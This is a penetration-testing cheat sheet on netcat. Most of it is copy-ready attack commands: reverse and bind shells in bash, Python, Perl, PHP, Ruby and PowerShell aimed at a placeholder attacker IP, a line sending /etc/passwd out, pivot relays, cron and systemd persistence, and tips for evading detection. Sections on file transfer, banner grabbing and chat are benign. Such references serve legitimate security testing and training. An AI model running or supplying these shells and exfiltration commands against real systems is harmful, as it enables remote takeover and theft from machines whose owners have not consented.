# Netcat Techniques

Comprehensive guide to netcat techniques for penetration testing, covering reverse shells, bind shells, file transfers, and more.

## Table of Contents

- [Reverse Shells](#reverse-shells)
  - [Linux Reverse Shells](#linux-reverse-shells)
  - [Windows Reverse Shells](#windows-reverse-shells)
  - [macOS Reverse Shells](#macos-reverse-shells)
- [Bind Shells](#bind-shells)
- [Shell Upgrades and Stabilization](#shell-upgrades-and-stabilization)
- [File Transfers](#file-transfers)
- [Port Scanning](#port-scanning)
- [Banner Grabbing](#banner-grabbing)
- [Chat and Messaging](#chat-and-messaging)
- [Relaying Connections](#relaying-connections)
- [Netcat Variants](#netcat-variants)
- [Encrypted Connections](#encrypted-connections)
- [Persistent Listeners](#persistent-listeners)
- [Tips and Best Practices](#tips-and-best-practices)

---

## Reverse Shells

Reverse shells initiate an outbound connection from the target to the attacker. This is preferred over bind shells because outbound connections are more likely to bypass firewalls.

### Attacker Listener Setup

Before executing any reverse shell on the target, set up a listener on the attacker machine:

```bash
# Basic listener
nc -lvnp 4444

# With rlwrap for command history and arrow key support
rlwrap nc -lvnp 4444

# Ncat with SSL encryption
ncat --ssl -lvnp 4444

# Keep listening after client disconnects (ncat only)
ncat -lvnkp 4444
```

### Linux Reverse Shells

#### With -e Support (nc.traditional)

```bash
# Basic reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# Using /bin/sh
nc <attacker_ip> 4444 -e /bin/sh
```

#### Without -e Support (nc.openbsd, most modern versions)

**Named Pipe Method (Most Reliable):**

```bash
# Standard mkfifo reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Interactive bash version
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Using different temp location (if /tmp is noexec)
rm -f /dev/shm/f; mkfifo /dev/shm/f; cat /dev/shm/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /dev/shm/f

# Using home directory
rm -f ~/.f; mkfifo ~/.f; cat ~/.f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > ~/.f
```

**Process Substitution Method:**

```bash
# Using bash process substitution
/bin/bash -c 'exec 5<>/dev/tcp/<attacker_ip>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
```

**Without Netcat on Target (Bash /dev/tcp):**

```bash
# Basic bash reverse shell (no netcat required)
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Alternative syntax
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'

# Using exec for cleaner shell
exec 5<>/dev/tcp/<attacker_ip>/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# Full interactive with stderr
0<&196;exec 196<>/dev/tcp/<attacker_ip>/4444; sh <&196 >&196 2>&196
```

**Using Other Interpreters:**

```bash
# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="<attacker_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("<attacker_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<attacker_ip>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Windows Reverse Shells

#### Using nc.exe on Windows

```cmd
:: Basic reverse shell (requires nc.exe on target)
nc.exe <attacker_ip> 4444 -e cmd.exe

:: Using PowerShell
nc.exe <attacker_ip> 4444 -e powershell.exe
```

#### PowerShell Reverse Shell (No Netcat Required)

```powershell
# One-liner PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded version (for avoiding detection)
powershell -e <base64_encoded_payload>
```

#### Ncat for Windows (with SSL)

```cmd
:: Encrypted reverse shell
ncat.exe --ssl <attacker_ip> 4444 -e cmd.exe
```

### macOS Reverse Shells

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1

# Using mkfifo (nc on macOS doesn't have -e)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Python (usually available on macOS)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## Bind Shells

Bind shells listen on the target machine for incoming connections. Use when outbound connections are blocked but inbound are allowed.

### Linux Bind Shells

```bash
# With -e support
nc -lvnp 4444 -e /bin/bash

# Without -e support (mkfifo method)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Connect from attacker
nc <target_ip> 4444
```

### Windows Bind Shells

```cmd
:: Using nc.exe
nc.exe -lvnp 4444 -e cmd.exe

:: Using ncat with access control
ncat.exe -lvnp 4444 -e cmd.exe --allow <attacker_ip>
```

### Bind Shell with Access Control (ncat)

```bash
# Only allow connections from specific IP
ncat -lvnp 4444 -e /bin/bash --allow 10.10.14.5

# Allow subnet
ncat -lvnp 4444 -e /bin/bash --allow 10.10.14.0/24
```

---

## Shell Upgrades and Stabilization

Raw netcat shells lack features like command history, tab completion, and proper terminal handling. Here's how to upgrade them.

### Using rlwrap (Attacker Side)

```bash
# Basic rlwrap - adds command history and line editing
rlwrap nc -lvnp 4444

# With vi mode
rlwrap -a nc -lvnp 4444
```

### Python PTY Upgrade

After getting a shell, upgrade on the target:

```bash
# Spawn PTY with Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Alternative using script
script /dev/null -c bash
script -qc /bin/bash /dev/null
```

### Full TTY Upgrade Process

Complete process for fully interactive shell:

```bash
# 1. On target: spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Background the shell
# Press Ctrl+Z

# 3. On attacker: configure terminal
stty raw -echo; fg

# 4. On target: set terminal type and size
export TERM=xterm-256color
stty rows 40 cols 160
```

### Alternative TTY Methods

```bash
# Using script command
script /dev/null -qc /bin/bash

# Using socat (if available on target)
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_ip>:4444

# Using expect
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or
/usr/bin/script -qc /bin/bash /dev/null

# Using perl
perl -e 'exec "/bin/sh";'
```

### Reset Terminal if Corrupted

```bash
# If shell gets messed up after Ctrl+C
reset
stty sane
```

---

## File Transfers

Netcat can transfer files between systems without relying on FTP, HTTP, or other services.

### Basic File Transfer

```bash
# Receiver (set up first)
nc -lvnp 4444 > received_file

# Sender
nc <receiver_ip> 4444 < file_to_send

# With progress indication (using pv if available)
pv file_to_send | nc <receiver_ip> 4444
```

### Transfer with Verification

```bash
# Sender (with checksum)
md5sum file_to_send
nc <receiver_ip> 4444 < file_to_send

# Receiver
nc -lvnp 4444 > received_file
md5sum received_file  # Compare with sender's checksum
```

### Directory Transfer

```bash
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/directory | nc <receiver_ip> 4444

# Compressed transfer
# Receiver
nc -lvnp 4444 | tar xzvf -

# Sender
tar czvf - /path/to/directory | nc <receiver_ip> 4444
```

### Binary Transfer (Windows to Linux)

```bash
# Linux receiver
nc -lvnp 4444 > file.exe

# Windows sender
nc.exe <linux_ip> 4444 < file.exe

# Or using type command
type file.exe | nc.exe <linux_ip> 4444
```

### Encrypted File Transfer (ncat)

```bash
# Receiver with SSL
ncat --ssl -lvnp 4444 > received_file

# Sender with SSL
ncat --ssl <receiver_ip> 4444 < file_to_send
```

### Transfer from Web to Target

```bash
# Attacker hosts file
python3 -m http.server 8080 &

# Target downloads via netcat (if curl/wget not available)
# First, send HTTP request
echo -e "GET /file.sh HTTP/1.0\r\nHost: <attacker_ip>\r\n\r\n" | nc <attacker_ip> 8080 > response
# Then extract body (skip headers)
sed '1,/^\r$/d' response > file.sh
```

---

## Port Scanning

Basic port scanning capabilities using netcat's zero-I/O mode.

### TCP Port Scanning

```bash
# Single port
nc -zvn <target_ip> 80

# Port range
nc -zvn <target_ip> 20-100

# Multiple specific ports
nc -zvn <target_ip> 22 80 443 8080

# With timeout (useful for slower networks)
nc -zvnw 2 <target_ip> 1-1000

# Verbose output to file
nc -zvn <target_ip> 1-1000 2>&1 | grep succeeded
```

### UDP Port Scanning

```bash
# UDP scan (less reliable - no connection handshake)
nc -zvnu <target_ip> 53 67 68 123 161

# Note: UDP scans are unreliable without sending protocol-specific data
```

### Scanning Through Proxy

```bash
# Using SOCKS proxy (nc.openbsd)
nc -X5 -x proxy:1080 -zvn <target_ip> 80

# HTTP CONNECT proxy
nc -Xconnect -x proxy:8080 -zvn <target_ip> 443
```

### Quick Scan Script

```bash
# Bash script for range scanning
for port in $(seq 1 1000); do
    nc -zvnw 1 <target_ip> $port 2>&1 | grep succeeded &
done; wait

# Faster with timeout
for port in 21 22 23 25 80 110 139 443 445 3389 8080; do
    timeout 1 nc -zvn <target_ip> $port 2>&1 | grep -v refused
done
```

---

## Banner Grabbing

Retrieve service banners to identify running services and versions.

### Basic Banner Grab

```bash
# Simple connection with timeout
echo "" | nc -vnw 2 <target_ip> 22
nc -vnw 2 <target_ip> 22 < /dev/null

# Using timeout command
timeout 2 nc -vn <target_ip> 22
```

### HTTP Banner

```bash
# HTTP GET request
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc <target_ip> 80

# Full headers
printf "GET / HTTP/1.1\r\nHost: <target_ip>\r\nConnection: close\r\n\r\n" | nc <target_ip> 80
```

### SMTP Banner

```bash
# SMTP greeting
nc <target_ip> 25

# Send EHLO to get more info
echo -e "EHLO test\r\nQUIT\r\n" | nc <target_ip> 25
```

### FTP Banner

```bash
# FTP greeting
echo "QUIT" | nc <target_ip> 21
```

### Multiple Port Banner Script

```bash
# Grab banners from common ports
for port in 21 22 25 80 110 143 443 3306 3389; do
    echo "=== Port $port ==="
    echo "" | nc -vnw 2 <target_ip> $port 2>/dev/null | head -5
done
```

### SSL Banner (using ncat or openssl)

```bash
# Using ncat
echo "" | ncat --ssl -vnw 2 <target_ip> 443

# Using openssl (for certificate info)
echo "" | openssl s_client -connect <target_ip>:443 2>/dev/null | head -20
```

---

## Chat and Messaging

Simple peer-to-peer communication using netcat.

### Basic Chat

```bash
# Machine A (listener)
nc -lvnp 4444

# Machine B (connector)
nc <machine_a_ip> 4444

# Now both parties can type and see each other's messages
```

### Encrypted Chat (ncat)

```bash
# Machine A
ncat --ssl -lvnp 4444

# Machine B
ncat --ssl <machine_a_ip> 4444
```

### Multi-client Chat Server (ncat)

```bash
# Server (broker mode)
ncat -lvnkp 4444 --broker

# Clients connect
ncat <server_ip> 4444
```

### One-way Broadcast

```bash
# Sender continuously broadcasts
while true; do echo "$(date): Server alive" | nc <receiver_ip> 4444; sleep 60; done

# Receiver listens
nc -lvnkp 4444
```

---

## Relaying Connections

Use netcat as a relay or proxy to pivot through networks.

### Simple Relay (Named Pipes)

```bash
# Create bidirectional relay on pivot machine
rm -f /tmp/relay; mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc <final_target> 22 > /tmp/relay

# Attacker connects to pivot:4444, traffic forwards to final_target:22
```

### Multi-hop Relay

```bash
# Pivot 1 (attacker -> pivot1:4444 -> pivot2:5555)
mkfifo /tmp/relay
nc -lvnp 4444 < /tmp/relay | nc pivot2 5555 > /tmp/relay

# Pivot 2 (pivot1 -> pivot2:5555 -> target:22)
mkfifo /tmp/relay
nc -lvnp 5555 < /tmp/relay | nc target 22 > /tmp/relay
```

### Port Forwarding with ncat

```bash
# Forward local port to remote
ncat -lvnkp 8080 -c "ncat <target> 80"

# Traffic to localhost:8080 forwards to target:80
```

### Using nc as SOCKS Proxy Alternative

```bash
# This creates a simple relay, not a full SOCKS proxy
# For actual SOCKS, use ssh -D or chisel

# Local port forward simulation
nc -lvnp 8080 -c "nc <internal_host> 80"
```

### Reverse Shell Relay

```bash
# Scenario: Target can only reach Pivot, Pivot can reach Attacker

# Attacker listener
nc -lvnp 4444

# Pivot relay (forward from target to attacker)
mkfifo /tmp/relay
nc -lvnp 5555 < /tmp/relay | nc <attacker> 4444 > /tmp/relay

# Target connects to pivot
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <pivot> 5555 > /tmp/f
```

---

## Netcat Variants

Understanding differences between nc implementations.

### nc.traditional (netcat-traditional)

```bash
# Has -e flag for command execution
nc -lvnp 4444 -e /bin/bash

# Has -c for command string
nc -lvnp 4444 -c '/bin/bash -i'

# Install on Debian/Ubuntu
sudo apt install netcat-traditional
```

### nc.openbsd (netcat-openbsd)

```bash
# No -e flag (safer)
# Has proxy support with -X and -x
nc -X5 -x socks_proxy:1080 target 80

# Has -q for delayed quit after EOF
nc -q 2 <target> 80 < request.txt

# Unix socket support
nc -U /var/run/docker.sock

# Install on Debian/Ubuntu
sudo apt install netcat-openbsd
```

### ncat (from Nmap project)

```bash
# SSL/TLS support
ncat --ssl <target> 443
ncat --ssl -lvnp 4444

# Persistent listener (keeps listening after disconnect)
ncat -lvnkp 4444

# Access control
ncat -lvnp 4444 --allow 10.10.14.0/24
ncat -lvnp 4444 --deny 192.168.1.0/24

# Execute command
ncat -lvnp 4444 -e /bin/bash
ncat -lvnp 4444 -c "echo 'Hello'"

# Broker mode (chat server)
ncat -lvnkp 4444 --broker

# Proxy support
ncat --proxy proxy:8080 --proxy-type http target 80

# Install on Debian/Ubuntu
sudo apt install ncat
```

### Variant Comparison

| Feature | nc.traditional | nc.openbsd | ncat |
|---------|---------------|------------|------|
| `-e` execute | Yes | No | Yes |
| SSL/TLS | No | No | Yes |
| Persistent listen | No | No | Yes (`-k`) |
| Proxy support | No | Yes | Yes |
| Access control | No | No | Yes |
| Unix sockets | Limited | Yes | Yes |
| UDP broadcast | Yes | Yes | Yes |

### Check Which Variant is Installed

```bash
# Check symlink
ls -la /usr/bin/nc

# Check alternatives
update-alternatives --display nc

# Check version/features
nc -h 2>&1 | head -20
```

### Switch Between Variants

```bash
# List available variants
sudo update-alternatives --config nc

# Or force specific variant
/usr/bin/nc.traditional -lvnp 4444 -e /bin/bash
/usr/bin/nc.openbsd -lvnp 4444
/usr/bin/ncat -lvnkp 4444
```

---

## Encrypted Connections

Secure communications using ncat's SSL capabilities.

### SSL Listener

```bash
# Basic SSL listener
ncat --ssl -lvnp 4444

# With certificate verification
ncat --ssl -lvnp 4444 --ssl-cert server.pem --ssl-key server-key.pem

# Verify client certificates
ncat --ssl -lvnp 4444 --ssl-verify --ssl-trustfile ca.pem
```

### SSL Client Connection

```bash
# Connect to SSL listener
ncat --ssl <target> 4444

# Skip certificate verification (self-signed)
ncat --ssl <target> 443

# With client certificate
ncat --ssl --ssl-cert client.pem --ssl-key client-key.pem <target> 4444
```

### Encrypted Reverse Shell

```bash
# Attacker listener (with SSL)
ncat --ssl -lvnp 4444

# Target reverse shell (encrypted)
ncat --ssl <attacker> 4444 -e /bin/bash

# Or with mkfifo method
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | ncat --ssl <attacker> 4444 > /tmp/f
```

### Generate Self-Signed Certificate

```bash
# Quick self-signed cert generation
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=localhost"

# Use with ncat
ncat --ssl -lvnp 4444 --ssl-cert cert.pem --ssl-key key.pem
```

---

## Persistent Listeners

Keep listening for connections after clients disconnect.

### Using ncat -k

```bash
# Persistent listener (reconnects accepted)
ncat -lvnkp 4444

# With command execution
ncat -lvnkp 4444 -e /bin/bash

# Note: Each connection gets a new shell instance
```

### Bash Loop Persistence

```bash
# Restart listener after each connection
while true; do nc -lvnp 4444; done

# With delay between restarts
while true; do nc -lvnp 4444; sleep 1; done
```

### Systemd Service (Production Scenarios)

```ini
# /etc/systemd/system/nc-listener.service
[Unit]
Description=Netcat Listener
After=network.target

[Service]
ExecStart=/usr/bin/nc -lvnp 4444
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
```

### Cron-based Persistence

```bash
# Check and restart listener every minute
* * * * * pgrep -f "nc -lvnp 4444" || nc -lvnp 4444 &
```

### Screen/Tmux Persistence

```bash
# Run listener in screen session
screen -dmS nc_listener nc -lvnp 4444

# Attach to check status
screen -r nc_listener

# With tmux
tmux new-session -d -s nc_listener 'nc -lvnp 4444'
tmux attach -t nc_listener
```

---

## Tips and Best Practices

### Port Selection

```bash
# Common ports that may bypass firewalls
80    # HTTP
443   # HTTPS
53    # DNS
8080  # HTTP Alternate
8443  # HTTPS Alternate
```

### Avoiding Detection

```bash
# Use SSL to encrypt traffic
ncat --ssl -lvnp 443

# Use common service ports
nc -lvnp 80   # Looks like HTTP
nc -lvnp 443  # Looks like HTTPS

# Minimize banner/connection noise
nc -vn   # Skip DNS lookups
```

### Troubleshooting Connections

```bash
# Test if port is listening
ss -tlnp | grep 4444
netstat -tlnp | grep 4444

# Test outbound connectivity from target
nc -zvn <attacker> 4444

# Check firewall rules
iptables -L -n
ufw status
```

### Clean Up

```bash
# Remove named pipes after use
rm -f /tmp/f
rm -f /dev/shm/f

# Kill background listeners
pkill -f "nc -lvnp"
kill $(lsof -t -i:4444)
```

### Quick Reference

```bash
# Listener with rlwrap (best for shells)
rlwrap nc -lvnp 4444

# Quick file exfil
nc <attacker> 4444 < /etc/passwd

# Quick shell (traditional nc)
nc <attacker> 4444 -e /bin/sh

# Quick shell (openbsd nc)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker> 4444 >/tmp/f
```

### Security Considerations

- Always use SSL/encryption when possible
- Clean up named pipes and temp files
- Use access control (`--allow`) with bind shells
- Prefer reverse shells over bind shells
- Use non-standard ports for persistence
- Consider using socat for more robust connections
